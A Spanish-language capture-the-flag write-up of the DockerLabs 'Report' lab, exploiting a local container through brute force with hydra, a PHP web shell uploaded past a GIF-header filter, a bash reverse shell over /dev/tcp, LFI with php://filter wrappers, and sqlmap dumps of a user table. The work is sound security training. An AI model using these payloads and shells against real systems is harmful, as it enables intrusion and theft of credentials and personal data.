---
title: DockerLabs - Report
summary: "Write-up del laboratorio Report de DockerLabs"
author: elcybercurioso
date: 2026-01-04
categories: [Post, DockerLabs]
tags: [medio, information disclosure, lfi, sqli, xss, arbitrary file upload, idor, business logic abuse, brute force, credentials leaking]
media_subpath: "/assets/img/posts/dockerlabs_report"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ nmap -sCV -p22,80,3306 172.17.0.2                             
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 58:46:38:70:8c:d8:4a:89:93:07:b3:43:17:81:59:f1 (ECDSA)
|_  256 25:99:39:02:52:4b:80:3f:aa:a8:9a:d4:8e:9a:eb:10 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://realgob.dl/
3306/tcp open  mysql   MariaDB 5.5.5-10.11.8
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
|   Thread ID: 9
|   Capabilities flags: 63486
|   Some Capabilities: SupportsLoadDataLocal, Support41Auth, SupportsTransactions, Speaks41ProtocolOld, ODBCClient, InteractiveClient, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsCompression, LongColumnFlag, DontAllowDatabaseTableColumn, IgnoreSigpipes, ConnectWithDatabase, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: qh6pS1:l6cr4K\m.=)RB
|_  Auth Plugin Name: mysql_native_password
```

## análisis

Al acceder a la IP asignada al laboratorio, vemos que nos redirige al dominio **realgob.dl**:

![Desktop View](/20251118215202.webp){: width="972" height="589" .shadow}

Por ello, procedemos a agregar dicho dominio en el fichero **/etc/hosts**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ cat /etc/hosts
...
172.17.0.2      realgob.dl
...
```

Si recargamos la pagina, veremos que ahora sí que nos carga correctamente:

![Desktop View](/20251118215233.webp){: width="972" height="589" .shadow}

Vemos que la página nos permite acceder con credenciales, pero debido a que no tenemos todavía nada por el estilo, procedemos a registrar una nueva cuenta:

![Desktop View](/20251119220300.webp){: width="972" height="589" .shadow}

Debemos rellenar el siguiente formulario y pinchar en el botón `Registrar`:

![Desktop View](/20251119220320.webp){: width="972" height="589" .shadow}

Una vez nos hayamos registrando, al acceder vemos que nos redirige automáticamente al perfil donde se lista la información que hemos aportado en el registro:

![Desktop View](/20251118221405.webp){: width="972" height="589" .shadow}

Mientras analizamos la página, dejaremos corriendo en segundo plano un escaneo por fuerza bruta de recursos empleando **gobuster** (aunque podemos emplear otros como **wfuzz** o **dirbuster**), el cual nos encuentra numerosos recursos que analizaremos uno por uno:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ gobuster dir -u "http://realgob.dl" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://realgob.dl
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/info.php             (Status: 200) [Size: 76226]
/uploads              (Status: 301) [Size: 310] [--> http://realgob.dl/uploads/]
/pages                (Status: 301) [Size: 308] [--> http://realgob.dl/pages/]
/admin.php            (Status: 200) [Size: 1005]
/assets               (Status: 301) [Size: 309] [--> http://realgob.dl/assets/]
/index.php            (Status: 200) [Size: 5048]
/includes             (Status: 301) [Size: 311] [--> http://realgob.dl/includes/]
/images               (Status: 301) [Size: 309] [--> http://realgob.dl/images/]
/about.php            (Status: 200) [Size: 4939]
/database             (Status: 301) [Size: 311] [--> http://realgob.dl/database/]
/api                  (Status: 301) [Size: 306] [--> http://realgob.dl/api/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/noticias.php         (Status: 200) [Size: 22]
/logs                 (Status: 301) [Size: 307] [--> http://realgob.dl/logs/]
/login.php            (Status: 200) [Size: 4350]
/LICENSE              (Status: 200) [Size: 0]
/contacto.php         (Status: 200) [Size: 2893]
/important.txt        (Status: 200) [Size: 1818]
/registro.php         (Status: 200) [Size: 2445]
/desarrollo           (Status: 301) [Size: 313] [--> http://realgob.dl/desarrollo/]
/server-status        (Status: 403) [Size: 275]
/gestion.php          (Status: 200) [Size: 0]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

### /info.php (Information Disclosure)

El recurso **info.php** vemos que se trata de un script que está ejecutando el comando `phpinfo()`, por lo que podemos ver información que no debería estar pública relacionada con la configuración de PHP de la máquina:

![Desktop View](/20251119230707.webp){: width="972" height="589" .shadow}

### /uploads (Information Disclosure)

La carpeta **uploads** vemos que nos permite listar una serie de carpetas, las cuales podría contener información de clientes o documentos privados:

![Desktop View](/20251120004822.webp){: width="972" height="589" .shadow}

### /admin.php (Insufficient Protection Against Brute-Force Attacks)

Encontramos un panel de autenticación en **admin.php**, el cual podemos intuir que es acceder a un panel con funcionalidades para administradores:

![Desktop View](/20251119222158.webp){: width="972" height="589" .shadow}

Probamos a acceder con las credenciales que tenemos tras registrarnos, pero vemos que no son correctas:

![Desktop View](/20251119222251.webp){: width="972" height="589" .shadow}

Procedemos a intentar obtener acceso al panel por fuerza bruta con **hydra** empleando un listado de usuarios y contraseñas comunes, el cual, pasado un rato, nos encuentra unas credenciales válidas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt realgob.dl http-post-form "/admin.php:username=^USER^&password=^PASS^:incorrectos" -I
[DATA] max 16 tasks per 1 server, overall 16 tasks, 22355 login tries (l:17/p:1315), ~1398 tries per task
[DATA] attacking http-post-form://realgob.dl:80/admin.php:username=^USER^&password=^PASS^:incorrectos
[80][http-post-form] host: realgob.dl   login: admin   password: a*******
```

### /cargas.php (Unauthorized File Upload + RCE)

El recurso **cargas.php** vemos que nos permite subir ficheros al servidor:

![Desktop View](/20251119225258.webp){: width="972" height="589" .shadow}

Creamos un script en PHP que, si llegamos a poder subirlo, nos permitirá ejecutar comandos de forma remota:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ cat cmd.php                                                                    
<?php
        system($_GET['cmd']);
?>
```

Tratamos de subirlo, y vemos que nos indica que el script no tiene un formato permitido:

![Desktop View](/20251119225433.webp){: width="972" height="589" .shadow}

Por ello, interceptamos la petición con **Burp Suite**, la mandamos al **Repeater**, donde tras probar varias técnicas, vemos que si cambiamos el **Content-Type** a `image/gif` y agregamos la cabecera `GIF8;` (estas modificaciones son para hacer creer al servidor que lo que estamos subiendo es una imagen de tipo GIF) nos permite subir el script:

![Desktop View](/20251119225613.webp){: width="972" height="589" .shadow}

Al acceder a este fichero, e indicar el parámetro y el comando a ejecutar, vemos que efectivamente tenemos la posibilidad de ejecutar comandos remotamente:

![Desktop View](/20251119225709.webp){: width="972" height="589" .shadow}

Para poder tener una consola completamente funcional, en primer lugar debemos ponernos en escucha con **nc**, y ejecutamos el siguiente comando:

```bash
http://realgob.dl/uploads/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/<nuestra IP>/<el puerto> 0>%261'
```

En la consola deberíamos haber obtenido correctamente la conexión:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 44774
www-data@d64220750c6a:/var/www/html/uploads$ whoami
whoami
www-data
www-data@d64220750c6a:/var/www/html/uploads$ hostname -I
hostname -I
172.17.0.2
```

Lo siguiente que haremos para obtener una consola completamente funcional será tratar la TTY para poder operar con mayor facilidad:

```bash
www-data@d64220750c6a:/var/www/html/uploads$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@d64220750c6a:/var/www/html/uploads$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ stty raw -echo;fg                               
[1]  + continued  nc -nlvp 4444
                               reset xterm
www-data@d64220750c6a:/var/www/html/uploads$ export TERM=xterm
www-data@d64220750c6a:/var/www/html/uploads$ export SHELL=bash
www-data@d64220750c6a:/var/www/html/uploads$ stty rows 49 columns 210
```

### /about.php (LFI)

Al acceder al recurso **about.php** veremos que se están cargando ficheros en la web haciendo referencia directa al nombre que tienen en el sistema:

![Desktop View](/20251120004408.webp){: width="972" height="589" .shadow}

En este tipo de situaciones, podemos alterar el fichero que se muestra por pantalla para ver otros que nos interese (empleando además otros ataques, como **Directory Path Traversal Attack**), como por ejemplo, el contenido del fichero `/etc/passwd`:

![Desktop View](/20251120004450.webp){: width="972" height="589" .shadow}

Tras revisar diferentes rutas de ficheros potencialmente interesantes, encontramos la ruta del fichero `config.php`, la cual normalmente contiene credenciales en texto claro, por lo que empleando un **wrapper** (código que permite realizar ciertas acciones no intencionadas en caso no haberse configurado correctamente) como el siguiente, el cual permite que el contenido de los scripts PHP no se interprete a la hora de explotar un **LFI** (Local File Inclusion) :

```bash
http://realgob.dl/about.php?file=php://filter/convert.iconv.utf8.utf16/resource=/var/www/html/config.php
```

![Desktop View](/20251120014048.webp){: width="972" height="589" .shadow}

Teniendo las credenciales de la base de datos del laboratorio, podemos llegar a conectarnos remotamente, ya la máquina tiene abierto el puerto 3306, permitiéndonos acceder desde nuestra máquina al gestor de bases de datos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report/php_filter_chain_generator]
└─$ mysql -h 172.17.0.2 -u root -p --ssl=0   
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 603982
Server version: 10.11.8-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use GOB_BD;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [GOB_BD]> select * from users;
+----+----------+--------------------------------------------------------------+---------------+----------+------------------------------+-----------+------------------------------------------+--------------+-------------+-----------+
| id | username | password                                                     | nombre        | apellido | email                        | dni       | direccion                                | telefono     | saldo       | no_cuenta |
+----+----------+--------------------------------------------------------------+---------------+----------+------------------------------+-----------+------------------------------------------+--------------+-------------+-----------+
|  1 | adan     | $2y$10$IBfPR1/zhLbcjeMz42BY/O.Qb2smhr4UYdyaet3UUvrd/txDxwHQC | Adan          | Martnez  | adan@gmail.com               | 12345678A | Calle de Ejemplo 123, Ciudad Ejemplo     | +34123456789 |       57.00 | 89542776  |
|  4 | yahir    | $2y$10$6d2LbTMyvhkloPQPUDl./e4SCDDMjp6eO9Qu62bS6C1VRkXeU501. | yahir         | lopez    | yahir23@gmail.com            | 23123     | La direccion mas prra #24 Colonia Grillo | 2325124523   |        0.00 | 96271035  |
|  5 | joaquin  | $2y$10$slvTyHz6jzbSt8Q3lejcCO3hSz/3lAZsWnH4.zJBRl83122M.zjz6 | joaquin       | guzman   | chapito@hotmail.com          | V2F9SK4   | Av Lautaro Calle Celeste #24             | 938572245    |      150.00 | 12726850  |
|  6 | Felipe   | $2y$10$fJhC6773D4IjdwtBq3JymeIRGCpGVYMZq23s7Lteq1NFeXVUhMozC | Felipe        | Calderas | calder98@gmail.com           | GS8GVS    | Colonia Centro Matamoros #232            | 728592354    |      150.00 | 74821147  |
|  7 | Eduardo  | $2y$10$Pv0A9MrBMJphE2J8t9ZZZu7f.hwq4MBq8ZRKqymAJbkF4eMAcDFey | Eduardo       | Felix    | lalomora@hotmail.com         | FG9S72K8  | Colonia Hernandez Monroy Av Eulalio #153 | 9784712841   |        7.00 | 46126168  |
|  8 | Andrea   | $2y$10$Hvr0/KwEIQQaMmUCWbXZFujw3/Zg4AGXDx2BcbFiOY0Y7IfqhURnC | Andrea        | Casas    | andycc2@gmail.com            | F9S8GKA8  | Calle Av Universal Tamaulipas Centro #85 | 8237850302   |        7.00 | 34343017  |
|  9 | vaxei    | $2y$10$IPffhz9cfTzFtRzBwFrapeare4J7HLYvfA3q/ZP8Xx9zRoBF8lQE6 | Vaxei         | Lopez    | usvaxei@gmail.com            | 938F8kG8  | Circuito del carmen #592 Bol             | 893858224    |      150.00 | 69878704  |
| 66 | admin    | $2y$10$hX7a7qAbulmNFfgmDzJEPOlxZbzR3jpdIJbyglA56C4beY923B9tO | Administrador |          | edo_administracion@gmail.com |           |                                          |              | 14030327.00 | 99999999  |
| 68 | test     | $2y$10$SV3gBMkmGpTkp.OWx4BIUul79zTO1/.8kL7ikjurwroN14lDxqBBK | test          | test     | test@test.com                | x         | x                                        | x            |      147.00 | 63600558  |
+----+----------+--------------------------------------------------------------+---------------+----------+------------------------------+-----------+------------------------------------------+--------------+-------------+-----------+
9 rows in set (0.001 sec)

MariaDB [GOB_BD]> select * from transacciones;
+----+---------+---------+----------------+------------------+---------------------+---------------+
| id | user_id | monto   | cuenta_destino | descripcion      | fecha               | cuenta_origen |
+----+---------+---------+----------------+------------------+---------------------+---------------+
|  1 |      66 |   23.00 | 99999999       | pago predial     | 2024-10-14 03:37:30 |               |
|  2 |       7 |   23.00 | 99999999       | Pago Multa       | 2024-10-14 04:26:58 | 46126168      |
|  3 |       7 |  120.00 | 99999999       | Deuda Escrituras | 2024-10-14 04:29:29 | 46126168      |
|  4 |       1 |   44.00 | 99999999       | rukaleta         | 2024-10-14 04:47:10 | 89542776      |
|  5 |       1 | 9923.00 | 99999999       | vocuher insignia | 2024-10-14 04:59:49 | 89542776      |
|  6 |       1 | 9923.00 | 99999999       | vocuher insignia | 2024-10-14 05:00:29 | 89542776      |
|  7 |       1 |   50.00 | 99999999       | nomas            | 2024-10-14 05:02:11 | 89542776      |
|  8 |       1 |  123.00 | 99999999       | extra            | 2024-10-14 05:03:21 | 89542776      |
|  9 |       1 | 9923.00 | 99999999       | vocuher insignia | 2024-10-14 05:04:41 | 89542776      |
| 10 |       1 |  407.00 | 89542776       | concepto 2321    | 2024-10-14 05:04:46 | 89542776      |
| 11 |       1 |  407.00 | 89542776       | concepto 2321    | 2024-10-14 05:08:26 | 89542776      |
| 12 |       7 |    2.00 | 99999999       | rea              | 2024-10-14 05:12:41 | 46126168      |
| 13 |       8 |  123.00 | 34343017       | real             | 2024-10-14 05:15:24 | 34343017      |
| 14 |       8 |   23.00 | 34343017       | tarjeta nueva    | 2024-10-14 05:17:44 | 34343017      |
| 15 |       8 |  123.00 | 34343017       | cheves           | 2024-10-14 05:18:08 | 34343017      |
| 16 |       8 |   12.00 | 99999999       | magic            | 2024-10-14 05:27:02 | 34343017      |
| 17 |       8 |  120.00 | 99999999       | concepto chidito | 2024-10-14 05:28:04 | 34343017      |
| 18 |       8 |  123.00 | 99999999       | descri           | 2024-10-14 05:29:55 | 34343017      |
| 19 |       8 |  120.00 | 99999999       | redis            | 2024-10-14 05:31:42 | 34343017      |
| 20 |      68 |    1.00 | 63600558       | test             | XXXX-XX-XX XX:XX:XX | 63600558      |
| 21 |      68 |    1.00 | 63600558       | test             | XXXX-XX-XX XX:XX:XX | 63600558      |
| 22 |      68 |    1.00 | 89542776       | test             | XXXX-XX-XX XX:XX:XX | 63600558      |
+----+---------+---------+----------------+------------------+---------------------+---------------+
22 rows in set (0.001 sec)
```

Por otro lado, podemos emplear el siguiente script de [python](https://github.com/synacktiv/php_filter_chain_generator/php_filter_chain_generator.py), el cual nos genera payloads empleando **cadenas de filtros de PHP**, los cuales permiten ejecutar comandos cuando encontremos casos de vulnerabilidades **LFI**, ya que estas cadenas se transforman posteriormente a texto claro:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ python3 php_filter_chain_generator.py --chain "<?php system('id'); ?>"
[+] The following gadget chain will generate the following code : <?php system('id'); ?> (base64 value: PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg)
php://<payload final>
```

Indicamos el payload en la URL como valor del parámetro **file**:

![Desktop View](/20251120021848.webp){: width="972" height="589" .shadow}

### /database (Information Disclosure)

Encontramos en el recurso **database** una serie de ficheros y una carpeta, los cuales, al revisarlo, vemos que se trata de la estructura de la base de datos definida en el servidor:

![Desktop View](/20251120003416.webp){: width="972" height="589" .shadow}

### /api (Information Disclosure)

El recurso **api** también nos permite listar una serie de ficheros, pero en este caso relacionada con una posible API configurada:

![Desktop View](/20251120011129.webp){: width="972" height="589" .shadow}

![Desktop View](/20251120011159.webp){: width="972" height="589" .shadow}

![Desktop View](/20251120011219.webp){: width="972" height="589" .shadow}

Sin embargo, tras revisar la máquina, lo único que podemos indicar de este recurso es que está filtrando información confidencial:

### /noticias.php (SQLi)

Descubrimos una vulnerabilidad **SQLi** (SQL Injection) en el recurso **noticias.php**:

![Desktop View](/20251120003828.webp){: width="972" height="589" .shadow}

Los pasos que hemos seguido para descubrir esta vulnerabilidad comienza tras interceptar una petición de carga del recurso **noticias.php**, y su almacenamiento en un fichero `.txt` con la opción `Copy to file`:

![Desktop View](/20251120020506.webp){: width="972" height="589" .shadow}

El fichero que contiene la petición se lo pasaremos a **sqlmap** para que, de manera automática, pruebe diferentes técnicas para explotar esta vulnerabilidad:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ sqlmap -r request.txt --level=5 --risk=3 --dbs --batch
        ___
       __H__                                                                                                                                                                                      
 ___ ___[)]_____ ___ ___  {1.9.9#stable}                                                                                                                                                          
|_ -| . [,]     | .`| . |                                                                                                                                                                         
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user`s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[XX:XX:XX] [INFO] parsing HTTP request from 'request.txt'
[XX:XX:XX] [INFO] resuming back-end DBMS 'mysql' 
[XX:XX:XX] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1088=1088

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3286 FROM (SELECT(SLEEP(5)))cmvc)
---
[XX:XX:XX] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[XX:XX:XX] [INFO] fetching database names
[XX:XX:XX] [INFO] fetching number of databases
[XX:XX:XX] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[XX:XX:XX] [INFO] retrieved: 6
[XX:XX:XX] [INFO] retrieved: information_schema
[XX:XX:XX] [INFO] retrieved: GOB_BD
[XX:XX:XX] [INFO] retrieved: mysql
[XX:XX:XX] [INFO] retrieved: performance_schema
[XX:XX:XX] [INFO] retrieved: sys
[XX:XX:XX] [INFO] retrieved: noticias
available databases [6]:
[*] GOB_BD
[*] information_schema
[*] mysql
[*] noticias
[*] performance_schema
[*] sys
```

Habiendo confirmado la vulnerabilidad tras obtener un listado de las bases de datos existentes, procedemos a listar las tablas de la base de datos **GOB_BD**, la cual probablemente sea la que se emplea en la página web del servidor:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ sqlmap -r request.txt --level=5 --risk=3 -D GOB_BD --tables --batch
        ___
       __H__                                                                                                                                                                                      
 ___ ___[,]_____ ___ ___  {1.9.9#stable}                                                                                                                                                          
|_ -| . [`]     | .`| . |                                                                                                                                                                         
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user`s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[XX:XX:XX] [INFO] parsing HTTP request from 'request.txt'
[XX:XX:XX] [INFO] resuming back-end DBMS 'mysql' 
[XX:XX:XX] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1088=1088

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3286 FROM (SELECT(SLEEP(5)))cmvc)
---
[XX:XX:XX] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[XX:XX:XX] [INFO] fetching tables for database: 'GOB_BD'
[XX:XX:XX] [INFO] fetching number of tables for database 'GOB_BD'
[XX:XX:XX] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[XX:XX:XX] [INFO] retrieved: 2
[XX:XX:XX] [INFO] retrieved: users
[XX:XX:XX] [INFO] retrieved: transacciones
Database: GOB_BD
[2 tables]
+---------------+
| transacciones |
| users         |
+---------------+
```

Una vez sabemos cuales son las tablas, obtenemos las columnas de la tabla **users**, ya que podría tener información crítica:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ sqlmap -r request.txt --level=5 --risk=3 -D GOB_BD -T users --columns --batch
        ___
       __H__                                                                                                                                                                                      
 ___ ___[,]_____ ___ ___  {1.9.9#stable}                                                                                                                                                          
|_ -| . [(]     | .`| . |                                                                                                                                                                         
|___|_  [`]_|_|_|__,|  _|                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user`s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[XX:XX:XX] [INFO] parsing HTTP request from 'request.txt'
[XX:XX:XX] [INFO] resuming back-end DBMS 'mysql' 
[XX:XX:XX] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1088=1088

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3286 FROM (SELECT(SLEEP(5)))cmvc)
---
[XX:XX:XX] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[XX:XX:XX] [INFO] fetching columns for table 'users' in database 'GOB_BD'
[XX:XX:XX] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[XX:XX:XX] [INFO] retrieved: 11
[XX:XX:XX] [INFO] retrieved: id
[XX:XX:XX] [INFO] retrieved: int(11)
[XX:XX:XX] [INFO] retrieved: username
[XX:XX:XX] [INFO] retrieved: varchar(50)
[XX:XX:XX] [INFO] retrieved: password
[XX:XX:XX] [INFO] retrieved: varchar(255)
[XX:XX:XX] [INFO] retrieved: nombre
[XX:XX:XX] [INFO] retrieved: varchar(100)
[XX:XX:XX] [INFO] retrieved: apellido
[XX:XX:XX] [INFO] retrieved: varchar(100)
[XX:XX:XX] [INFO] retrieved: email
[XX:XX:XX] [INFO] retrieved: varchar(100)
[XX:XX:XX] [INFO] retrieved: dni
[XX:XX:XX] [INFO] retrieved: varchar(20)
[XX:XX:XX] [INFO] retrieved: direccion
[XX:XX:XX] [INFO] retrieved: varchar(255)
[XX:XX:XX] [INFO] retrieved: telefono
[XX:XX:XX] [INFO] retrieved: varchar(20)
[XX:XX:XX] [INFO] retrieved: saldo
[XX:XX:XX] [INFO] retrieved: decimal(10,2)
[XX:XX:XX] [INFO] retrieved: no_cuenta
[XX:XX:XX] [INFO] retrieved: varchar(8)
Database: GOB_BD
Table: users
[11 columns]
+-----------+---------------+
| Column    | Type          |
+-----------+---------------+
| apellido  | varchar(100)  |
| direccion | varchar(255)  |
| dni       | varchar(20)   |
| email     | varchar(100)  |
| id        | int(11)       |
| no_cuenta | varchar(8)    |
| nombre    | varchar(100)  |
| password  | varchar(255)  |
| saldo     | decimal(10,2) |
| telefono  | varchar(20)   |
| username  | varchar(50)   |
+-----------+---------------+
```

Sabiendo las columnas, procedemos a extraer los usuarios y las contraseñas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ sqlmap -r request.txt --level=5 --risk=3 -D GOB_BD -T users -C username,password --dump --batch
        ___
       __H__                                                                                                                                                                                      
 ___ ___[)]_____ ___ ___  {1.9.9#stable}                                                                                                                                                          
|_ -| . [`]     | .`| . |                                                                                                                                                                         
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user`s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[XX:XX:XX] [INFO] parsing HTTP request from 'request.txt'
[XX:XX:XX] [INFO] resuming back-end DBMS 'mysql' 
[XX:XX:XX] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1088=1088

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3286 FROM (SELECT(SLEEP(5)))cmvc)
---
[XX:XX:XX] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[XX:XX:XX] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'GOB_BD'
[XX:XX:XX] [INFO] fetching number of column(s) 'password,username' entries for table 'users' in database 'GOB_BD'
Database: GOB_BD
Table: users
[9 entries]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| yahir    | $2y$10$6d2L************************************************* |
| Felipe   | $2y$10$fJhC************************************************* |
| Andrea   | $2y$10$Hvr0************************************************* |
| admin    | $2y$10$hX7a************************************************* |
| adan     | $2y$10$IBfP************************************************* |
| vaxei    | $2y$10$IPff************************************************* |
| Eduardo  | $2y$10$Pv0A************************************************* |
| joaquin  | $2y$10$slvT************************************************* |
| test     | $2y$10$SV3g************************************************* |
+----------+--------------------------------------------------------------+
```

Con esta información, ahora podemos tratar de obtener las credenciales por fuerza bruta empleando herramientas como **john** o **HashCat**.

### /logs (Information Disclosure)

Aquí encontramos un par de ficheros, los cuales contienen cierta información relacionada con el servidor web, pero, tras analizarlos, no encontramos nada relevante.

![Desktop View](/20251120015546.webp){: width="972" height="589" .shadow}

En caso de que estos ficheros fuesen los ficheros de log empleados por el servidor web, se podría haber llegado a explotar vulnerabilidades como, por ejemplo, **Log Poisoning** (envenenar peticiones para introducir texto que, al listar el contenido de un log, se interprete y permita ejecutar comandos).

### /login.php (Users Enumeration by Brute Force)

En el panel de autenticación (**login.php**) encontramos que se pueden llegar a listar los usuarios existentes empleando fuerza bruta, ya que según si el usuario existe o no, el mensaje que nos devuelve es diferente.

Si el usuario no existe, indica que el nombre de usuario no se ha encontrado:

![Desktop View](/20251119220204.webp){: width="670" height="420" .shadow}

Mientras que si tratamos de acceder con un usuario existente (el cual creamos anteriormente), vemos que indica que la contraseña no es correcta:

![Desktop View](/20251119220435.webp){: width="670" height="420" .shadow}

Por este motivo, con herramientas como **hydra** podemos obtener un listado de usuarios existente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Report]
└─$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p qwerty realgob.dl http-post-form "/login.php:username=^USER^&password=^PASS^:encontrado" 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking http-post-form://realgob.dl:80/login.php:username=^USER^&password=^PASS^:encontrado
[80][http-post-form] host: realgob.dl   login: admin   password: qwerty
[80][http-post-form] host: realgob.dl   login: andrea   password: qwerty
[80][http-post-form] host: realgob.dl   login: eduardo   password: qwerty
[80][http-post-form] host: realgob.dl   login: felipe   password: qwerty
[80][http-post-form] host: realgob.dl   login: joaquin   password: qwerty
